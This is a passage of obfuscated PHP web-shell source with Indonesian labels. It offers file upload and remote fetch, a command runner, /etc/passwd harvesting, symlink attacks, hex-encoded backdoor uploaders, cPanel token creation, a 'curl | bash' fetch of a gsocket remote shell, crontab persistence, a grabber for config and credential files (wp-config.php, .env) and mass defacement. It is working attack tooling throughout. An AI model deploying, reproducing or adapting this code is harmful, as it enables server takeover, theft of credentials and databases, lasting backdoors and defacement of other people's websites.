    echo '<span class="badge bg-danger me-1">S'.'u'.'do</span>';
}
if (@$fxt("/"."us"."r/b"."in/p"."k"."e"."x"."e"."c")) {
    echo '<span class="badge bg-success me-1">Pk'.'e'.'x'.'e'.'c</span>';
} else {
    echo '<span class="badge bg-danger me-1">Pk'.'e'.'x'.'e'.'c</span>';
}
echo '</div>';
echo '</div>';
echo '</div>';
echo '<div class="breadcrumb-custom"><strong><i class="fas fa-folder-open"></i> Di'.'rect'.'ory:</strong> ';

foreach($_POST as $key => $value){
	$_POST[$key] = $sts($value);
}

$lokasi = $srl('\\','/',$lokasi);
$lokasis = $exp('/',$lokasi);
$lokasinya = @$scd($lokasi);

foreach($lokasis as $id => $lok){
if($lok == '' && $id == 0){
		$a = true;
		echo '<a href="'.mkUrl(array('loknya' => '/')).'">/</a>';
		continue;
	}
	if($lok == '') continue;
	$crum = '';
	for($i=0;$i<=$id;$i++){
	$crum .= "$lokasis[$i]";
	if($i != $id) $crum .= "/";
}
echo '<a href="'.mkUrl(array('loknya' => $crum)).'">'.$lok.'</a>/';
}

echo '</div>';
if (isset($_POST['upwkwk'])) {
	if (isset($_POST['berkasnya'])) {
		if ($_POST['di'.'rnya'] == "2") {
			$lokasi = $_SERVER['DOC'.'UME'.'NT_R'.'OOT'];
		}
		if (empty($_FILES['ber'.'kas']['name'])) {
			echo oren("Fi"."le not Se"."lected !");
		} else {
			$tgn = $ftm($lokasi);
			$data = @$fpt($lokasi."/".$_FILES['ber'.'kas']['name'], @$fgt($_FILES['ber'.'kas']['tm'.'p_na'.'me']));
				if ($fxt($lokasi."/".$_FILES['ber'.'kas']['name'])) {
					$fl = $lokasi."/".$_FILES['ber'.'kas']['name'];
					green("Fi"."le Upl"."oa"."ded! <strong>".$fl."</strong>");
					if ($sps($lokasi, $_SERVER['DO'.'CU'.'M'.'ENT'.'_R'.'OO'.'T']) !== false) {
						$lwb = $srl($_SERVER['DO'.'CU'.'M'.'ENT'.'_R'.'OO'.'T'], $wb."/", $fl);
						echo '<div class="alert-success-custom">Li'.'nk: <a href="'.$lwb.'" class="text-gold">'.$lwb.'</a></div>';
					}
					@$tch($lokasi, $tgn);@$tch($lokasi."/".$_FILES['ber'.'kas']['name'], $tgn);
				} else {
					red("Fa"."ile"."d to Up"."lo"."ad !");
			}
		}
	} elseif (isset($_POST['linknya'])) {
		if (empty($_POST['namalink'])) {
			echo oren("Fi"."lename cannot be empty !");
		} elseif (empty($_POST['darilink'])) {
			echo oren("Li"."nk cannot be empty !");
		} else {
			if ($_POST['di'.'rnya'] == "2") {
			$lokasi = $_SERVER['DOC'.'UME'.'NT_R'.'OOT'];
			}
				$tgn = $ftm($lokasi);
				$data = @$fpt($lokasi."/".$_POST['namalink'], @$fgt($_POST['darilink']));
				if ($fxt($lokasi."/".$_POST['namalink'])) {
					$fl = $lokasi."/".$_POST['namalink'];
					green("Fi"."le Uplo"."ade"."d! <strong>".$fl."</strong>");
					if ($sps($lokasi, $_SERVER['DO'.'CU'.'M'.'ENT'.'_R'.'OO'.'T']) !== false) {
						$lwb = $srl($_SERVER['DO'.'CU'.'M'.'ENT'.'_R'.'OO'.'T'], $wb."/", $fl);
						echo '<div class="alert-success-custom">Li'.'nk: <a href="'.$lwb.'" class="text-gold">'.$lwb.'</a></div>';
					}
					@$tch($lokasi, $tgn);@$tch($lokasi."/".$_POST['namalink'], $tgn);
				} else {
					red("Fa"."iled to Up"."lo"."ad !");
				}
		}
	}
}

echo '<div class="info-card">';
echo '<h5><i class="fas fa-upload"></i> Uplo'.'ad Fi'.'le</h5>';
echo '<form enctype="multip'.'art/form'.'-data" method="p'.'ost" class="mb-0">';
echo '<div class="mb-3">';
echo '<div class="form-check form-check-inline">';
echo '<input class="form-check-input" type="radio" value="1" name="di'.'rnya" id="dir1" checked>';
echo '<label class="form-check-label" for="dir1">cur'.'ren'.'t_di'.'r ['.cdrd().']</label>';
echo '</div>';
echo '<div class="form-check form-check-inline">';
echo '<input class="form-check-input" type="radio" value="2" name="di'.'rnya" id="dir2">';
echo '<label class="form-check-label" for="dir2">docu'.'men'.'t_ro'.'ot ['.crt().']</label>';
echo '</div>';
echo '</div>';
echo '<input type="hidden" name="upwkwk" value="aplod">';
echo '<div class="row g-2 mb-3">';
echo '<div class="col-md-8">';
echo '<input type="fi'.'le" name="berkas" class="form-control">';
echo '</div>';
echo '<div class="col-md-4">';
echo '<button type="submit" name="berkasnya" class="btn btn-primary-custom w-100"><i class="fas fa-upload"></i> Up'.'load</button>';
echo '</div>';
echo '</div>';
echo '<div class="row g-2">';
echo '<div class="col-md-5">';
echo '<input type="text" name="darilink" class="form-control" placeholder="https://go'.'ogle.com/upl'.'oad.txt">';
echo '</div>';
echo '<div class="col-md-3">';
echo '<input type="text" name="namalink" class="form-control" placeholder="fi'.'le.txt">';
echo '</div>';
echo '<div class="col-md-4">';
echo '<button type="submit" name="linknya" class="btn btn-primary-custom w-100"><i class="fas fa-link"></i> Upload from URL</button>';
echo '</div>';
echo '</div>';
echo '</form>';
echo '</div>';
echo '<div class="info-card">';
echo '<h5><i class="fas fa-terminal"></i> Co'.'mm'.'an'.'d</h5>';
echo '<form method="post" enctype="appl'.'ication/x-ww'.'w-form-u'.'rlencoded" class="mb-0">';
echo '<div class="input-group">';
echo '<input type="text" name="komend" class="form-control" value="';
if (isset($_POST['komend'])) {
	echo $hsc($_POST['komend']);
} else {
	echo "un"."am"."e -"."a";
}
echo '">';
echo '<button type="submit" name="komends" class="btn btn-primary-custom"><i class="fas fa-play"></i> Run</button>';
echo '</div>';
echo '</form>';
echo '</div>';

if (isset($_GET['loknya']) && $_GET['opsi'] == "lompat") {
	if ($ird("/e"."tc"."/p"."as"."sw"."d")) {
		$fjp = $fgt("/e"."tc"."/p"."as"."sw"."d");
	} elseif (!empty(komenb("ca"."t /e"."tc/"."pa"."ss"."wd", $lokasi))) {
		$fjp = komenb("ca"."t /e"."tc/"."pa"."ss"."wd", $lokasi);
	} else {
		die(red("[!] Gagal Mengambil Di"."rect"."ory !"));
	}
	$pma("/\/ho"."me\/(.*?):/i", $fjp, $fjpr);
	$fjpr = $fjpr[1];
	if (empty($fjpr)) {
		die(red("[!] Tidak Ada Us"."er di Temukan !"));
	}
	echo "Total Ada ".$ctn($aru($fjpr))." di"."rec"."to"."ry di Ser"."ver <font color=gold>".$_SERVER[$rad]."</font><br><br>";
	foreach ($aru($fjpr) as $fj) {
		$fjh = "/h"."om"."e/".$fj."/pu"."bl"."ic_h"."tml";
		if ($ird("/e"."tc"."/na"."me"."d.co"."nf")) {
			$etn = $fgt("/e"."tc"."/na"."me"."d.co"."nf");
			$pma("/\/v"."ar\/na"."me"."d\/(.*?)\.d"."b/i", $etn, $en);
			$en = $en[1];
			if ($ird($fjh)) {
				echo "[<font color=green>Re"."ada"."ble</font>] <a href='".$_SERVER['SC'.'RIP'.'T_N'.'AME'].mkUrl(array('loknya' => $fjh))."'>".$fjh."</a> => ";
			} else {
				echo "[<font color=red>Un"."rea"."dab"."le</font>] ".$fjh."</a> => ";
			}
			foreach ($aru($en) as $enw) {
				$asd = $pgw(@$fow("/e"."tc/"."val"."ias"."es/".$enw));
				$asd = $asd['name'];
				if ($asd == $fj) {
					echo "<a href='http://".$enw."' target=_blank><font color=gold>".$enw."</font></a>, ";
				}
			}
			echo "<br>";
		} else {
			if ($ird($fjh)) {
				echo "[<font color=green>Re"."ada"."ble</font>] <a href='".$_SERVER['SC'.'RIP'.'T_N'.'AME'].mkUrl(array('loknya' => $fjh))."'>".$fjh."</a><br>";
			} else {
				echo "[<font color=red>Un"."rea"."dab"."le</font>] ".$fjh."</a><br>";
			}
		}
	}
	echo "<hr>";
	die(author());
} elseif (isset($_GET['loknya']) && $_GET['opsi'] == "esyeem") {
	if ($ird("/e"."tc"."/p"."as"."sw"."d")) {
		$syp = $fgt("/e"."tc"."/p"."as"."sw"."d");
	} elseif (!empty(komenb("ca"."t /e"."tc/"."pa"."ss"."wd", $lokasi))) {
		$syp = komenb("ca"."t /e"."tc/"."pa"."ss"."wd", $lokasi);
	} else {
		die(red("[!] Gagal Mengambil Di"."rec"."to"."ry !"));
	}
	if (!$fnct("sy"."mli"."nk")) {
		if (!$fnct("pr"."oc_"."op"."en")) {
			die(red("[!] Sy"."mli"."nk Fu"."nct"."ion is Di"."sabl"."ed !"));
		}
	}
	echo "<center>[ <gold>GR"."AB CO"."NFIG</gold> ] - [ <a href='".mkUrl(array('loknya' => $lokasi, 'opsi' => 'esyeem', 'opsidua' => 'syfile'))."'><gold>SY"."MLI"."NK FI"."LE</gold></a> ] - [ <gold>SY"."MLI"."NK VH"."OST</gold> ]</center>";
	if (isset($_GET['opsidua'])) {
		if ($_GET['opsidua'] == "gra"."bco"."nfig") {
			# code...
		} elseif ($_GET['opsidua'] == "s"."yfile") {
			echo "<br><br><center>Opsi : <gold>Sy"."mli"."nk Fi"."le</gold>";
			echo '<form method="post">File : 
			<input type="text" name="domena" style="cursor: pointer; border-color: #000" class="up" placeholder="/ho'.'me/'.'use'.'r/p'.'ubli'.'c_ht'.'ml/da'.'tab'.'ase.'.'php">
			<input type="submit" name="gaskeun" value="Gaskeun" class="up" style="cursor: pointer">
			</form></center>';
			if (isset($_POST['gaskeun'])) {
				$rend = rand().".txt";
				$lokdi = $_POST['domena'];
				esyeem($lokdi, "an"."on_s"."ym/".$rend);
				echo '<br><center>Cek : <a href="an'.'on_'.'sy'.'m/'.$rend.'"><gold>'.$rend."</gold></a></center><br>";
			}
		}
		echo "<hr>";
		die(author());
	}
	$pma("/\/ho"."me\/(.*?):/i", $syp, $sypr);
	$sypr = $sypr[1];
	if (empty($sypr)) {
		die(red("[!] Tidak Ada Us"."er di Temukan !"));
	}
	echo "Total Ada ".$ctn($aru($sypr))." Us"."er di Ser"."ver <font color=gold>".$_SERVER[$rad]."</font><br><br>";
	if (!$isw(getcwd())) {
		die(red("[!] Gagal Sy"."mli"."nk - Red D"."ir !"));
	}
	if (!$fxt("an"."on_"."sy"."m")) {
		$mdr("an"."on_"."sy"."m");
	}
	if (!$fxt("an"."on_"."sy"."m/.ht"."acc"."ess")) {
		$fpt("an"."on_"."sy"."m/."."h"."ta"."cce"."ss", $urd("Opt"."ions%20In"."dexe"."s%20Fol"."lowSy"."mLi"."nks%0D%0ADi"."rect"."oryIn"."dex%20sss"."sss.htm%0D%0AAdd"."Type%20txt%20.ph"."p%0D%0AAd"."dHand"."ler%20txt%20.p"."hp"));
	}
	$ckn = esyeem("/", "an"."on_"."sy"."m/anon");
	foreach ($aru($sypr) as $sj) {
		$sjh = "/h"."om"."e/".$sj."/pu"."bl"."ic_h"."tml";
		$ygy = $srl($bsn($_SERVER['SC'.'RI'.'PT_NA'.'ME']), "an"."on_"."sy"."m/anon".$sjh, $_SERVER['SC'.'RI'.'PT_NA'.'ME']);
		if ($ird("/e"."tc"."/na"."me"."d.co"."nf")) {
			$etn = $fgt("/e"."tc"."/na"."me"."d.co"."nf");
			$pma("/\/v"."ar\/na"."me"."d\/(.*?)\.d"."b/i", $etn, $en);
			$en = $en[1];
			echo "[<font color=gold>Sy"."mli"."nk</font>] <a href='".$ygy."' target=_blank>".$sjh."</a> => ";
			foreach ($aru($en) as $enw) {
				$asd = $pgw(@$fow("/e"."tc/"."val"."ias"."es/".$enw));
				$asd = $asd['name'];
				if ($asd == $sj) {
					echo "<a href='http://".$enw."' target=_blank><font color=gold>".$enw."</font></a>, ";
				}
			}
			echo "<br>";
		} else {
			echo "[<font color=gold>Sy"."mli"."nk</font>] <a href='".$ygy."' target=_blank>".$sjh."</a><br>";
		}
	}
	echo "<hr>";
	die(author());
} elseif (isset($_GET['loknya']) && $_GET['opsi'] == "bekup") {
	if (isset($_POST['lo'.'kr'.'una'])) {
		echo "<center>";
		echo "Path : <gold>".$hsc($_POST['lo'.'kr'.'una'])."</gold><br>";
		if (!$isr($_POST['lo'.'kr'.'una'])) {
			die(red("[+] Cur"."rent Pa"."th is Unre"."adable !"));
		} elseif (!$isw($_POST['lo'.'kr'.'una'])) {
			die(red("[+] Cur"."rent Pa"."th is Un"."wri"."tea"."ble !"));
		}
		$loks = sds($_POST['lo'.'kr'.'una']);
		$pisah = $ars($loks, -50);
		$los = $arr($pisah, 2);
		$satu = $loks[$los[0]];
		$satut = $ftm($satu);
		$dua = $loks[$los[1]];
		$duat = $ftm($dua);
		if (empty($satu) && empty($dua)) {
			die(red("[+] Unknown Error !"));
		}
		echo "<br>";
		if (!$isw($satu)) {
			echo "[<merah>Fa"."il"."ed</merah>] ".$satu."<br>";
		} else {
			$satus = $satu."/cont"."act.p"."hp";
			$fpt($satus, $h2b("3c6d65746120636f6e74656e743d226e6f696e646578226e616d653d22726f626f7473223e436f6e74616374204d653c666f726d20656e63747970653d226d756c7469706172742f666f726d2d64617461226d6574686f643d22706f7374223e3c696e707574206e616d653d226274756c22747970653d2266696c65223e3c627574746f6e3e4761736b616e3c2f627574746f6e3e3c2f666f726d3e3c3f3d22223b24613d2766272e2769272e276c272e2765272e275f272e2770272e2775272e2774272e275f272e2763272e276f272e276e272e2774272e2765272e276e272e2774272e2773273b24623d2766272e2769272e276c272e2765272e275f272e2767272e2765272e2774272e275f272e2763272e276f272e276e272e2774272e2765272e276e272e2774272e2773273b24633d2774272e276d272e2770272e275f272e276e272e2761272e276d272e2765273b24643d2768272e276578272e273262272e27696e273b24663d2766272e27696c272e27655f65272e277869272e277374272e2773273b696628697373657428245f46494c45535b276274756c275d29297b246128245f46494c45535b276274756c275d5b276e616d65275d2c246228245f46494c45535b276274756c275d5b24635d29293b696628246628272e2f272e245f46494c45535b276274756c275d5b276e616d65275d29297b6563686f20274f6b652021273b7d656c73657b6563686f20274661696c2021273b7d7d696628697373657428245f4745545b27667074275d29297b246128246428245f504f53545b2766275d292c246428245f504f53545b2764275d29293b696628246628246428245f504f53545b2766275d2929297b6563686f20224f6b652021223b7d656c73657b6563686f20224661696c2021223b7d7d3f3e"));
			$tch($satus, $satut);
			$tch($satu, $satut);
			echo "[<ijo>Su"."cc"."ess</ijo>] ".$satus."<br>";
			if ($sps($_POST['lo'.'kr'.'una'], $_SERVER['DO'.'CU'.'M'.'ENT'.'_R'.'OO'.'T']) !== false) {
				$lwb = $srl($_SERVER['DO'.'CU'.'M'.'ENT'.'_R'.'OO'.'T'], $wb, $satus);
				$satul = "<br><a href='".$lwb."'><font color='gold'>".$lwb."</font></a><br>";
			}
		}
		if (!$isw($dua)) {
			echo "[<merah>Fa"."il"."ed</merah>] ".$dua."<br>";
		} else {
			$duas = $dua."/setti"."ng.p"."hp";
			$fpt($duas, $h2b("3c6d657461206e616d653d22726f626f74732220636f6e74656e743d226e6f696e646578223e0d0a4d792053657474696e670d0a3c3f7068700d0a2461203d20226669222e226c655f70222e2275745f63222e226f6e74222e2265222e226e74222e2273223b0d0a2462203d202266222e22696c222e22655f6765222e2274222e225f636f222e226e74656e74222e2273223b0d0a2463203d20226669222e226c65222e225f6578222e226973222e227473223b0d0a2464203d202268222e226578222e223262222e22696e223b0d0a69662028697373657428245f504f53545b276b6f64275d2929207b0d0a09246128245f504f53545b276c6f6b275d2c20246428245f504f53545b276b6f64275d29293b0d0a0969662028246328245f504f53545b276c6f6b275d2929207b0d0a09096563686f20224f4b202120223b0d0a097d20656c7365207b0d0a09096563686f20224661696c6564202120223b0d0a097d0d0a7d0d0a69662028697373657428245f4745545b276963275d2929207b0d0a09696e636c75646520245f4745545b276963275d3b0d0a7d0d0a69662028697373657428245f4745545b276170275d2929207b0d0a0924612822776b776b2e706870222c20246428223363366436353734363132303665363136643635336432323732366636323666373437333232323036333666366537343635366537343364323236653666363936653634363537383232336534333666366537343631363337343230346436353363363636663732366432303664363537343638366636343364323237303666373337343232323036353665363337343739373036353364323236643735366337343639373036313732373432663636366637323664326436343631373436313232336533633639366537303735373432303734373937303635336432323636363936633635323232303665363136643635336432323632373437353663323233653363363237353734373436663665336534373631373336623631366533633266363237353734373436663665336533633266363636663732366433653061336333663730363837303061323436313230336432303232363632323265323236393232326532323663323232653232363532323265323235663232326532323730323232653232373532323265323237343232326532323566323232653232363332323265323236663232326532323665323232653232373432323265323236353232326532323665323232653232373432323265323237333232336230613234363232303364323032323636323232653232363932323265323236633232326532323635323232653232356632323265323236373232326532323635323232653232373432323265323235663232326532323633323232653232366632323265323236653232326532323734323232653232363532323265323236653232326532323734323232653232373332323362306132343633323033643230323237343232326532323664323232653232373032323265323235663232326532323665323232653232363132323265323236643232326532323635323233623061363936363230323836393733373336353734323832343566343634393463343535333562323736323734373536633237356432393239323037623234363132383234356634363439346334353533356232373632373437353663323735643562323736653631366436353237356432633230323436323238323435663436343934633435353335623237363237343735366332373564356232343633356432393239336236393636323032383636363936633635356636353738363937333734373332383232326532663232326532343566343634393463343535333562323736323734373536633237356435623237366536313664363532373564323932393230376236353633363836663230323234663662363532303231323233623764323036353663373336353230376236353633363836663230323234363631363936633230323132323362376437643061336633652229293b0d0a096966202824632822776b222e22776b2e222e227068222e2270222929207b0d0a09096563686f20224f4b2021223b0d0a097d0d0a7d0d0a3f3e"));
			$tch($duas, $duat);
			$tch($dua, $duat);
			echo "[<ijo>Su"."cc"."ess</ijo>] ".$duas."<br>";
			if ($sps($_POST['lo'.'kr'.'una'], $_SERVER['DO'.'CU'.'M'.'ENT'.'_R'.'OO'.'T']) !== false) {
				$lwb = $srl($_SERVER['DO'.'CU'.'M'.'ENT'.'_R'.'OO'.'T'], $wb, $duas);
				$dual = "<a href='".$lwb."'><font color='gold'>".$lwb."</font></a><br>";
			}
		}
		echo "<br>";
		if (!empty($satul)) {
			echo $satul;
		}
		if (!empty($dual)) {
			echo $dual;
		}
		echo "</center>";
	} else {
		echo "<center>Masukkan Lokasi Docu"."ment Ro"."ot<br>";
		echo '<form method="post"><input type="text" name="lokruna" value="'.$hsc($_GET['loknya']).'" style="cursor: pointer; border-color: #000" class="up"> ';
		echo '<input type="submit" name="palepale" value="Gaskan" class="up" style="cursor: pointer"></form>';
	}
	die();
} elseif (isset($_GET['opsi']) && $_GET['opsi'] == "repip") {
	echo "<center>";
	echo "Re"."ver"."se I"."P : <gold>".$hsc($_SERVER['SE'.'RVE'.'R_NA'.'ME'])."</gold>";
	echo "<pre>".$hsc(crul("http"."s://ap"."i.ha"."ck"."ertarg"."et.com/re"."verse"."ipl"."ookup/?q=".$_SERVER['SE'.'RVE'.'R_NA'.'ME']))."</pre>";
	echo "</center>";
	die();
} elseif (isset($_GET['loknya']) && $_GET['opsi'] == "cpanel") {
	echo "<center>";
	$randName = "Maw".rand(100,999);
	$cmd = "ua"."pi Tok"."ens crea"."te_fu"."ll_ac"."cess n"."ame='".$randName."'";
	echo "<pre>".$hsc(komenb($cmd, $lokasi))."</pre>";
	echo "<hr>";
	die(author());
} elseif (isset($_GET['loknya']) && $_GET['opsi'] == "gsocket") {
	echo "<center>";
	$cmd = "cu"."rl -f"."sSL h"."tt"."ps://gs"."ock"."et."."io/x | b"."ash";
	echo "<pre>".$hsc(komenb($cmd, $lokasi))."</pre>";
	echo "<hr>";
	die(author());
} elseif (isset($_GET['loknya']) && $_GET['opsi'] == "adminer") {
	echo "<center>";
	$url = "ht"."tps://gi"."thu"."b.co"."m/vr"."ana/ad"."min"."er/rele"."ases/dow"."nloa"."d/v4."."8.1/ad"."min"."er-4.8.1.p"."hp";
	$data = @$fgt($url);
	if ($data !== false) {
		$result = @$fpt($lokasi."/ad"."min"."er.p"."hp", $data);
		if ($result !== false && $fxt($lokasi."/ad"."min"."er.p"."hp")) {
			green("Ad"."min"."er berh"."asil di-do"."wnl"."oad: ".$lokasi."/ad"."min"."er.p"."hp");
			if ($sps($lokasi, $_SERVER['DO'.'CU'.'M'.'ENT'.'_R'.'OO'.'T']) !== false) {
				$lwb = $srl($_SERVER['DO'.'CU'.'M'.'ENT'.'_R'.'OO'.'T'], $wb."/", $lokasi."/ad"."min"."er.p"."hp");
				echo '<div class="alert-success-custom">Li'.'nk: <a href="'.$lwb.'" class="text-gold">'.$lwb.'</a></div>';
			}
		} else {
			red("Ga"."gal men"."yim"."pan ad"."min"."er.p"."hp!");
		}
	} else {
		red("Ga"."gal men"."dow"."nlo"."ad ad"."min"."er!");
	}
	echo "<hr>";
	die(author());
} elseif (isset($_GET['loknya']) && $_GET['opsi'] == "cron") {
	echo "<center>";
	echo "<h5 style='color:#fff'>CRO".'NJ'.'OB MA'.'NA'.'GER</h5>';
	$tmpf = $lokasi."/.cr"."on"."tmp";
	if (isset($_POST['savecron'])) {
		@$fpt($tmpf, $_POST['crontext']);
		if ($fxt("/u"."sr/b"."in/c"."ront"."ab")) {
			$res = komenb("cr"."ont"."ab ".$tmpf, $lokasi);
		} elseif ($fxt("/u"."sr/b"."in/c"."ron"."tab")) {
			$res = komenb("cro"."nt"."ab ".$tmpf, $lokasi);
		} else {
			$res = komenb("cr"."ont"."ab ".$tmpf, $lokasi);
		}
		@$ulk($tmpf);
		if (empty($res)) {
			green("Cr"."on s"."av"."ed suc"."ces"."sfu"."lly!");
		} else {
			red("Er"."ror: ".$hsc($res));
		}
	}
	$crondata = komenb("cr"."ont"."ab -l", $lokasi);
	if (empty($crondata) || $sps($crondata, "no crontab") !== false) {
		$crondata = "# No crontab found - add your entries here\n# Example: * * * * * /path/to/command";
	}
	echo '<form method="post">';
	echo '<textarea name="crontext" cols="85" rows="16" style="background:#0a0a0a;color:#e5e5e5;border:1px solid #1f1f1f;font-family:JetBrains Mono,monospace;font-size:0.85rem;padding:12px;border-radius:6px;width:100%">'.$hsc($crondata).'</textarea><br><br>';
	echo '<button type="submit" name="savecron" class="btn btn-primary-custom"><i class="fas fa-save"></i> SA'.'VE CR'.'ON</button>';
	echo '</form>';
	echo "<hr>";
	die(author());
} elseif (isset($_GET['loknya']) && $_GET['opsi'] == "config") {
	echo "<center>";
	echo "<h5 style='color:#fff'>CON".'FIG GRA'.'BBER</h5>';
	$docRoot = $_SERVER['DO'.'CU'.'M'.'ENT'.'_R'.'OO'.'T'];
	echo "<p style='color:#808080'>Scann"."ing fro"."m: <span style='color:#d4af37'>".$hsc($docRoot)."</span></p>";
	$cfgPatterns = array(
		"wp-co"."nfi"."g.p"."hp",
		".e"."nv",
		"con"."fig.p"."hp",
		"dat"."abase."."ph"."p",
		"se"."tti"."ngs.p"."hp",
		"con"."figu"."rat"."ion.p"."hp",
		"lo"."cal-c"."onf"."ig.ph"."p",
		".en"."v.lo"."cal",
		"db.ph"."p",
		"dbco"."nfi"."g.p"."hp",
		"my"."sql.p"."hp",
		"co"."nn"."ect.p"."hp",
		"kon"."ek"."si.p"."hp",
		"cre"."den"."tials.ph"."p",
		"se"."cret.p"."hp",
		"ap"."p/co"."nfig/da"."tab"."ase.p"."hp",
		"inc"."lud"."es/co"."nf"."ig.ph"."p",
		"i"."nc/co"."nf"."ig.ph"."p",
	);
	$found = cfgSc($docRoot, $cfgPatterns);
	if (empty($found)) {
		echo oren("No co"."nfig files fo"."und in cur"."rent di"."rec"."to"."ry!");
	} else {
		$ctn = "co"."unt";
		echo "<p>Found <strong style='color:#d4af37'>".$ctn($found)."</strong> config ".($ctn($found) > 1 ? "files" : "file")."</p>";
		foreach ($found as $f) {
			echo "<div style='background:#0a0a0a;border:1px solid #1f1f1f;border-radius:6px;padding:12px;margin-bottom:12px;text-align:left'>";
			echo "<strong style='color:#d4af37'><i class='fas fa-file-code'></i> ".$hsc($f)."</strong>";
			echo "<pre style='margin-top:8px;max-height:400px;overflow-y:auto'>".$hsc(@$fgt($f))."</pre>";
			echo "</div>";
		}
	}
	echo "<hr>";
	die(author());
} elseif (isset($_GET['loknya']) && $_GET['opsi'] == "mdf") {
	echo "<center>";
	if (empty($_POST['palepale'])) {
		echo '<form method="post">';
		echo 'Di'.'r : <input type="text" name="lokena" class="up" style="cursor: pointer; border-color: #000" value="'.$hsc($_GET['loknya']).'"><br>';
		echo 'Nama Fi'.'le : <input type="text" name="nfil" class="up" style="cursor: pointer; border-color: #000" value="ind'.'ex.p'.'hp"><br><br>';
		echo 'Isi Fi'.'le : <br><textarea class="up" cols="80" rows="20" name="isikod"></textarea><br><br>';
		echo '<select name="opsina"><option value="mdf">Ma'.'ss Def'.'ace</option><option value="mds">Ma'.'ss De'.'fa'.'ce 2</option></select><br><br>';
		echo '<input type="submit" name="palepale" value="Gaskeun" class="up" style="cursor: pointer">';
		echo '</form>';
	} else {
		$lokena = $_POST['lokena'];
		$nfil = $_POST['nfil'];
		$isif = $_POST['isikod'];
		echo "Di"."r : <gold>".$hsc($lokena)."</gold><br>";
		if (!$fxt($lokena)) {
			die(red("[+] Di"."re"."cto"."ry Tidak di Temukan !"));
		}
		$g = $scd($lokena);
		if (isset($_POST['opsina']) && $_POST['opsina'] == "mds") {
			foreach ($g as $gg) {
				if (isset($gg) && $gg == "." || $gg == "..") {
					continue;
				} elseif (!$idr($gg)) {
					continue;
				}
				if (!$isw($lokena."/".$gg)) {
					echo "[<merah>Un"."wri"."tea"."ble</merah>] ".$lokena."/".$gg."<br>";
					continue;
				}
				$loe = $lokena."/".$gg."/".$nfil;
				$cf = $fgr($gg);
				if ($cf == "9"."9") {
					if ($fpt($loe, $isif) !== false) {
						if ($sps($gg, ".") !== false) {
							echo "[<ijo>Su"."cc"."ess</ijo>] ".$loe." -> <a href='//".$gg."/".$nfil."'><gold>".$gg."/".$nfil."</gold></a><br>";
						} else {
							echo "[<ijo>Su"."cc"."ess</ijo>] ".$loe."<br>";
						}
					}
				}
			}
			echo "<hr>";
			die(author());
		}
		foreach ($g as $gg) {
			if (isset($gg) && $gg == "." || $gg == "..") {
				continue;
			} elseif (!$idr($gg)) {
				continue;
			}
			if (!$isw($lokena."/".$gg)) {
				echo "[<merah>Un"."wri"."tea"."ble</merah>] ".$lokena."/".$gg."<br>";
				continue;
			}
$loe = $lokena."/".$gg."/".$nfil;
			if ($fpt($loe, $isif) !== false) {
				echo "[<ijo>Su"."cc"."ess</ijo>] ".$loe."<br>";
			} else {
				echo "[<merah>Un"."wri"."tea"."ble</merah>] ".$lokena."/".$gg."<br>";
			}
		}
	}
	echo "<hr>";
	echo "</center>";
	die(author());
} elseif (isset($_GET['loknya']) && $_GET['opsi'] == "recent") {
	function maw_rsm($dr, $dep, &$lst, &$capx) {
		$scx = "sc"."an"."di"."r";
		$fix = "is"."_fi"."le";
		$dix = "is"."_di"."r";
		$rax = "is"."_re"."ada"."ble";
		$ftx = "fi"."lem"."ti"."me";
		if ($dep > 6 || $capx > 2500) return;
		$its = @$scx($dr);
		if (!is_array($its)) return;
		foreach ($its as $it) {
			if ($it === '.' || $it === '..') continue;
			$p = rtrim($dr, '/') . '/' . $it;
			if ($fix($p)) {
				$capx++;
				$t = @$ftx($p);
				if ($t !== false) {
					$lst[] = array($p, $t);
				}
			} elseif ($dix($p)) {
				if ($rax($p)) {
					maw_rsm($p, $dep + 1, $lst, $capx);
				}
			}
		}
	}
	$tjual = array();
	$kapas = 0;
	maw_rsm($lokasi, 0, $tjual, $kapas);
	usort($tjual, function($a, $b) { return $b[1] - $a[1]; });
	$tjual = $ars($tjual, 0, 30);
	echo "<center><h5 style='color:#fff'><i class='fas fa-history'></i> RE"."CENT FI"."LES</h5>";
	if (empty($tjual)) {
		echo oren("Tidak ada file terbaru di direktori ini.");
	} else {
		echo "<p style='color:#808080'>Menampilkan <span style='color:#d4af37'>".$ctn($tjual)."</span> file terbaru dari <span style='color:#d4af37'>".$hsc($lokasi)."</span></p>";
		echo '<div class="table-responsive">
		<table class="table table-hover table-bordered">
		<thead>
		<tr>
		<th>Name</th>
		<th class="text-center">Size</th>
		<th class="text-center">Last Modified</th>
		<th class="text-center">Owner / Group</th>
		<th class="text-center">Permissions</th>
		<th class="text-center">Actions</th>
		</tr>
		</thead>
		<tbody>';
		foreach ($tjual as $fjual) {
			$path = $fjual[0];
			if (!$fxt($path)) continue;
			$nm = $bsn($path);
			$dirnow = dirname($path);
			$skd = "1024";
			$size = $fsz($path) / $skd;
			$size = $rd($size, 3);
			if ($size >= $skd) {
				$size = $rd($size / $skd, 2) . ' MB';
			} else {
				$size = $size . ' KB';
			}
			echo "<tr>
			<td>" . cfn($path) . " <a href=\"".mkUrl(array('lokasie' => $path, 'loknya' => $dirnow))."\">" . $hsc($nm) . "</a></td>
			<td class='text-center'>" . $size . "</td>
			<td class='text-center'>" . fdt($path) . "</td>
			<td class='text-center'>" . gor($path) . " / " . ggr($path) . "</td>
			<td class='text-center'>";
			if ($isw($path)) {
				echo '<span class="text-success">';
			} elseif (!$isr($path)) {
				echo '<span class="text-danger">';
			}
			echo statusnya($path);
			if ($isw($path) || !$isr($path)) {
				echo '</span>';
			}
			echo "</td>
			<td class='text-center'>
			<a href=\"".mkUrl(array('lokasie' => $path, 'loknya' => $dirnow))."\" class='btn btn-sm btn-action me-1' title='View'><i class='fas fa-eye'></i></a>
			<form method=\"post\" action=\"".mkUrl(array('pilihan' => '1', 'loknya' => $dirnow))."\" class=\"d-inline\">
			<input type=\"hidden\" name=\"d\" value=\"".mawEn(array('type' => 'file', 'loknya' => $path))."\">
			<button type='submit' class='btn btn-sm btn-action me-1' name='pilih' value='edit' title='Edit'><i class='fas fa-edit'></i></button>
			<button type='submit' class='btn btn-sm btn-action me-1' name='pilih' value='ubahnama' title='Rename'><i class='fas fa-signature'></i></button>
			<button type='submit' class='btn btn-sm btn-action' name='pilih' value='hapus' title='Delete'><i class='fas fa-trash'></i></button>
			</form></td>
			</tr>";
		}
		echo '</tbody></table></div>';
	}
echo "<hr>";
	die(author());
} elseif (isset($_GET['loknya']) && $_GET['opsi'] == "bndr") {
	$ob = @$igt("open"."_basedi"."r");
